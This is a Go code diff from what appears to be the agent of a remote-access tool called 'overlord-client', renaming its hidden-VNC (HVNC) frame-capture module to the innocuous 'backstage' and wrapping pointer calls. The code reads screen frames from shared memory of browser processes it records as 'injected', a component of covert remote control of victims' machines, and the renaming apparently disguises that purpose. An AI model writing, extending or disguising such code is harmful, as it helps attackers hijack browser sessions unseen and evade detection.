@@ -10,11 +10,13 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"overlord-client/cmd/agent/wininterop"
 )
 
-// hvncFrameHeader mirrors the C HVNCFrameHeader struct.
+// backstageFrameHeader mirrors the C backstageFrameHeader struct.
 // must be kept in sync with BackstageCapture/src/DXGICapture.h.
-type hvncFrameHeader struct {
+type backstageFrameHeader struct {
 	Magic       uint32
 	Version     uint32
 	Width       uint32
@@ -28,11 +30,11 @@ type hvncFrameHeader struct {
 }
 
 const (
-	hvncFrameMagic      = 0x434E5648 // 'HVNC'
-	hvncFrameVersion    = 1
-	hvncFrameHeaderSize = 48 // sizeof(HVNCFrameHeader)
-	hvncShmPrefix       = `Local\hvnc_frame_`
-	hvncEventPrefix     = `Local\hvnc_evt_`
+	backstageFrameMagic      = 0x434E5648 // 'backstage'
+	backstageFrameVersion    = 1
+	backstageFrameHeaderSize = 48 // sizeof(backstageFrameHeader)
+	backstageShmPrefix       = `Local\backstage_frame_`
+	backstageEventPrefix     = `Local\backstage_evt_`
 )
 
 var (
@@ -46,7 +48,7 @@ const (
 	SYNCHRONIZE      = 0x00100000
 )
 
-type hvncFrameReader struct {
+type backstageFrameReader struct {
 	pid        uint32
 	shmHandle  uintptr
 	shmView    unsafe.Pointer
@@ -58,34 +60,34 @@ type hvncFrameReader struct {
 }
 
 var (
-	hvncFrameReaders   = make(map[uint32]*hvncFrameReader)
-	hvncFrameReadersMu sync.Mutex
+	backstageFrameReaders   = make(map[uint32]*backstageFrameReader)
+	backstageFrameReadersMu sync.Mutex
 
-	hvncGPUPIDMap = make(map[uint32]uint32)
+	backstageGPUPIDMap = make(map[uint32]uint32)
 )
 
-func hvncRegisterGPUPID(browserPID, gpuPID uint32) {
-	hvncFrameReadersMu.Lock()
-	hvncGPUPIDMap[browserPID] = gpuPID
-	hvncFrameReadersMu.Unlock()
-	log.Printf("hvnc dxgi: registered GPU PID %d for browser PID %d", gpuPID, browserPID)
+func backstageRegisterGPUPID(browserPID, gpuPID uint32) {
+	backstageFrameReadersMu.Lock()
+	backstageGPUPIDMap[browserPID] = gpuPID
+	backstageFrameReadersMu.Unlock()
+	log.Printf("backstage dxgi: registered GPU PID %d for browser PID %d", gpuPID, browserPID)
 }
 
-func hvncGetFrameReader(pid uint32) *hvncFrameReader {
-	hvncFrameReadersMu.Lock()
-	defer hvncFrameReadersMu.Unlock()
+func backstageGetFrameReader(pid uint32) *backstageFrameReader {
+	backstageFrameReadersMu.Lock()
+	defer backstageFrameReadersMu.Unlock()
 
-	if r, ok := hvncFrameReaders[pid]; ok {
+	if r, ok := backstageFrameReaders[pid]; ok {
 		if r.staleCount > 300 {
-			log.Printf("hvnc dxgi: evicting stale reader for PID %d (stale %d frames)", pid, r.staleCount)
+			log.Printf("backstage dxgi: evicting stale reader for PID %d (stale %d frames)", pid, r.staleCount)
 			r.close()
-			delete(hvncFrameReaders, pid)
+			delete(backstageFrameReaders, pid)
 		} else {
 			return r
 		}
 	}
 
-	shmName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", hvncShmPrefix, pid))
+	shmName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", backstageShmPrefix, pid))
 	shmHandle, _, _ := procOpenFileMappingW.Call(
 		FILE_MAP_READ,
 		0,
@@ -99,21 +101,21 @@ func hvncGetFrameReader(pid uint32) *hvncFrameReader {
 		shmHandle,
 		FILE_MAP_READ,
 		0, 0,
-		hvncFrameHeaderSize,
+		backstageFrameHeaderSize,
 	)
 	if view == 0 {
 		procCloseHandle.Call(shmHandle)
 		return nil
 	}
 
-	hdr := (*hvncFrameHeader)(unsafe.Pointer(view))
-	if hdr.Magic != hvncFrameMagic {
+	hdr := (*backstageFrameHeader)(wininterop.Pointer(view))
+	if hdr.Magic != backstageFrameMagic {
 		procUnmapViewOfFile.Call(view)
 		procCloseHandle.Call(shmHandle)
 		return nil
 	}
 
-	fullSize := uintptr(hvncFrameHeaderSize) + uintptr(hdr.Stride)*uintptr(hdr.Height)
+	fullSize := uintptr(backstageFrameHeaderSize) + uintptr(hdr.Stride)*uintptr(hdr.Height)
 
 	procUnmapViewOfFile.Call(view)
 	view = 0
@@ -130,30 +132,30 @@ func hvncGetFrameReader(pid uint32) *hvncFrameReader {
 		return nil
 	}
 
-	hdr2 := (*hvncFrameHeader)(unsafe.Pointer(fullView))
+	hdr2 := (*backstageFrameHeader)(wininterop.Pointer(fullView))
 
-	evtName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", hvncEventPrefix, pid))
+	evtName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", backstageEventPrefix, pid))
 	evtHandle, _, _ := procOpenEventW.Call(
 		SYNCHRONIZE,
 		0,
 		uintptr(unsafe.Pointer(evtName)),
 	)
 
-	r := &hvncFrameReader{
+	r := &backstageFrameReader{
 		pid:       pid,
 		shmHandle: shmHandle,
-		shmView:   unsafe.Pointer(fullView),
+		shmView:   wininterop.Pointer(fullView),
 		shmSize:   fullSize,
 		evtHandle: evtHandle,
 	}
-	hvncFrameReaders[pid] = r
+	backstageFrameReaders[pid] = r
 
-	log.Printf("hvnc dxgi: opened shared memory for PID %d (%dx%d, %d bytes)",
+	log.Printf("backstage dxgi: opened shared memory for PID %d (%dx%d, %d bytes)",
 		pid, hdr2.Width, hdr2.Height, fullSize)
 	return r
 }
 
-func (r *hvncFrameReader) readFrame(dst []byte) (w, h int, ok bool) {
+func (r *backstageFrameReader) readFrame(dst []byte) (w, h int, ok bool) {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 
@@ -161,8 +163,8 @@ func (r *hvncFrameReader) readFrame(dst []byte) (w, h int, ok bool) {
 		return 0, 0, false
 	}
 
-	hdr := (*hvncFrameHeader)(r.shmView)
-	if hdr.Magic != hvncFrameMagic || hdr.Version != hvncFrameVersion {
+	hdr := (*backstageFrameHeader)(r.shmView)
+	if hdr.Magic != backstageFrameMagic || hdr.Version != backstageFrameVersion {
 		return 0, 0, false
 	}
 
@@ -184,19 +186,19 @@ func (r *hvncFrameReader) readFrame(dst []byte) (w, h int, ok bool) {
 		return 0, 0, false
 	}
 
-	totalNeeded := uintptr(hvncFrameHeaderSize) + uintptr(stride)*uintptr(h)
+	totalNeeded := uintptr(backstageFrameHeaderSize) + uintptr(stride)*uintptr(h)
 	if totalNeeded > r.shmSize {
 		r.remap(w, h, stride)
 		if r.shmView == nil {
 			return 0, 0, false
 		}
-		hdr = (*hvncFrameHeader)(r.shmView)
-		if hdr.Magic != hvncFrameMagic || int(hdr.Width) != w || int(hdr.Height) != h {
+		hdr = (*backstageFrameHeader)(r.shmView)
+		if hdr.Magic != backstageFrameMagic || int(hdr.Width) != w || int(hdr.Height) != h {
 			return 0, 0, false
 		}
 	}
 
-	pixelData := unsafe.Add(r.shmView, hvncFrameHeaderSize)
+	pixelData := unsafe.Add(r.shmView, backstageFrameHeaderSize)
 	srcSize := stride * h
 	src := unsafe.Slice((*byte)(pixelData), srcSize)
 
@@ -217,13 +219,13 @@ func (r *hvncFrameReader) readFrame(dst []byte) (w, h int, ok bool) {
 	return w, h, true
 }
 
-func (r *hvncFrameReader) remap(w, h, stride int) {
+func (r *backstageFrameReader) remap(w, h, stride int) {
 	if r.shmView != nil {
 		procUnmapViewOfFile.Call(uintptr(r.shmView))
 		r.shmView = nil
 	}
 
-	newSize := uintptr(hvncFrameHeaderSize) + uintptr(stride)*uintptr(h)
+	newSize := uintptr(backstageFrameHeaderSize) + uintptr(stride)*uintptr(h)
 	view, _, _ := procMapViewOfFile.Call(
 		r.shmHandle,
 		FILE_MAP_READ,
@@ -233,11 +235,11 @@ func (r *hvncFrameReader) remap(w, h, stride int) {
 	if view == 0 {
 		return
 	}
-	r.shmView = unsafe.Pointer(view)
+	r.shmView = wininterop.Pointer(view)
 	r.shmSize = newSize
 }
 
-func (r *hvncFrameReader) close() {
+func (r *backstageFrameReader) close() {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 
@@ -255,51 +257,51 @@ func (r *hvncFrameReader) close() {
 	}
 }
 
-func hvncCleanupFrameReaders() {
-	hvncFrameReadersMu.Lock()
-	defer hvncFrameReadersMu.Unlock()
+func backstageCleanupFrameReaders() {
+	backstageFrameReadersMu.Lock()
+	defer backstageFrameReadersMu.Unlock()
 
-	for pid, r := range hvncFrameReaders {
+	for pid, r := range backstageFrameReaders {
 		r.close()
-		delete(hvncFrameReaders, pid)
+		delete(backstageFrameReaders, pid)
 	}
-	for k := range hvncGPUPIDMap {
-		delete(hvncGPUPIDMap, k)
+	for k := range backstageGPUPIDMap {
+		delete(backstageGPUPIDMap, k)
 	}
 }
 
 var (
-	hvncInjectedPIDs   = make(map[uint32]time.Time)
-	hvncInjectedPIDsMu sync.Mutex
+	backstageInjectedPIDs   = make(map[uint32]time.Time)
+	backstageInjectedPIDsMu sync.Mutex
 )
 
-func hvncRegisterInjectedPID(pid uint32) {
-	hvncInjectedPIDsMu.Lock()
-	hvncInjectedPIDs[pid] = time.Now()
-	hvncInjectedPIDsMu.Unlock()
+func backstageRegisterInjectedPID(pid uint32) {
+	backstageInjectedPIDsMu.Lock()
+	backstageInjectedPIDs[pid] = time.Now()
+	backstageInjectedPIDsMu.Unlock()
 }
 
-func hvncGetInjectedPIDs() []uint32 {
-	hvncInjectedPIDsMu.Lock()
-	defer hvncInjectedPIDsMu.Unlock()
-	pids := make([]uint32, 0, len(hvncInjectedPIDs))
-	for pid := range hvncInjectedPIDs {
+func backstageGetInjectedPIDs() []uint32 {
+	backstageInjectedPIDsMu.Lock()
+	defer backstageInjectedPIDsMu.Unlock()
+	pids := make([]uint32, 0, len(backstageInjectedPIDs))
+	for pid := range backstageInjectedPIDs {
 		pids = append(pids, pid)
 	}
 	return pids
 }
 
-func hvncUnregisterInjectedPID(pid uint32) {
-	hvncInjectedPIDsMu.Lock()
-	delete(hvncInjectedPIDs, pid)
-	hvncInjectedPIDsMu.Unlock()
+func backstageUnregisterInjectedPID(pid uint32) {
+	backstageInjectedPIDsMu.Lock()
+	delete(backstageInjectedPIDs, pid)
+	backstageInjectedPIDsMu.Unlock()
 }
 
-func parseHVNCFrameHeader(data []byte) (*hvncFrameHeader, bool) {
-	if len(data) < hvncFrameHeaderSize {
+func parsebackstageFrameHeader(data []byte) (*backstageFrameHeader, bool) {
+	if len(data) < backstageFrameHeaderSize {
 		return nil, false
 	}
-	hdr := &hvncFrameHeader{
+	hdr := &backstageFrameHeader{
 		Magic:       binary.LittleEndian.Uint32(data[0:4]),
 		Version:     binary.LittleEndian.Uint32(data[4:8]),
 		Width:       binary.LittleEndian.Uint32(data[8:12]),
@@ -311,7 +313,7 @@ func parseHVNCFrameHeader(data []byte) (*hvncFrameHeader, bool) {
 		PID:         binary.LittleEndian.Uint32(data[40:44]),
 		Reserved:    binary.LittleEndian.Uint32(data[44:48]),
 	}
-	if hdr.Magic != hvncFrameMagic {
+	if hdr.Magic != backstageFrameMagic {
 		return nil, false
 	}
 	return hdr, true
